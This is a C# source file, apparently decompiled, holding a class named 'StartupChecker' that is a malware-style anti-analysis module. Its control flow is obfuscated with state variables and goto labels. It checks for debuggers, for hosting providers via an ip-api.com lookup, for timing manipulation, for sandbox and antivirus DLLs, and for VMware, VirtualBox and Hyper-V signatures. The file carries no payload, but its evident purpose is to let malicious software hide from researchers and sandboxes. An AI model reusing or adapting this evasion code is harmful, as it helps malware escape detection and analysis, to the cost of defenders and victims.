using System;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace MyAppNamespace
{
    internal class StartupChecker
    {
        public static bool IsSuspiciousEnvironment()
        {
            int checkStep = 0;
            while (checkStep != 6)
            {
                if (checkStep != 3)
                {
                    if (checkStep == 4)
                    {
                        goto IL_73;
                    }
                    if (checkStep == 5)
                    {
                        goto IL_9D;
                    }
                    if (checkStep == 1)
                    {
                        if (!StartupChecker.IsDebuggerAttached())
                        {
                            goto IL_49;
                        }
                        checkStep = 2;
                    }
                    if (checkStep == 2)
                    {
                        return true;
                    }
                    if (checkStep == 0)
                    {
                        checkStep = 1;
                    }
                    if (checkStep == 7)
                    {
                        return false;
                    }
                    continue;
                }
                IL_49:
                if (StartupChecker.IsHostedServer())
                {
                    return true;
                }
                IL_73:
                if (StartupChecker.IsTimeManipulated())
                {
                    return true;
                }
                IL_9D:
                if (StartupChecker.IsVirtualEnvironment())
                {
                    return true;
                }
                break;
            }
            if (StartupChecker.IsRunningInVirtualMachine())
            {
                return true;
            }
            return false;
        }

        public static bool IsDebuggerAttached()
        {
            int step = 0;
            bool isDebuggerPresent = false;
            do
            {
                if (step == 1)
                {
                    isDebuggerPresent = false;
                    step = 2;
                }
                if (step == 0)
                {
                    step = 1;
                }
            }
            while (step != 2);
            bool result;
            try
            {
                StartupChecker.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                result = isDebuggerPresent;
            }
            catch
            {
                result = isDebuggerPresent;
            }
            return result;
        }

        public static bool IsHostedServer()
        {
            try
            {
                string response = new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting");
                return response.Contains("true");
            }
            catch
            {
                return false;
            }
        }

        public static bool IsTimeManipulated()
        {
            try
            {
                long ticksBeforeSleep = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticksBeforeSleep < 10L)
                {
                    return true;
                }
            }
            catch
            {
            }
            return false;
        }

        public static bool IsVirtualEnvironment()
        {
            string[] suspiciousModules = { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
            foreach (string module in suspiciousModules)
            {
                IntPtr moduleHandle = StartupChecker.GetModuleHandle(module);
                if (moduleHandle != IntPtr.Zero)
                {
                    return true;
                }
            }
            return false;
        }

        public static bool IsRunningInVirtualMachine()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementBaseObject system in searcher.Get())
                    {
                        string manufacturer = system["Manufacturer"].ToString().ToLower();
                        string model = system["Model"].ToString().ToUpperInvariant();

                        if ((manufacturer == "microsoft corporation" && model.Contains("VIRTUAL")) ||
                            manufacturer.Contains("vmware") ||
                            model == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            catch
            {
                return true;
            }

            foreach (ManagementBaseObject videoController in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                string name = videoController.GetPropertyValue("Name").ToString();
                if (name.Contains("VMware") || name.Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
}
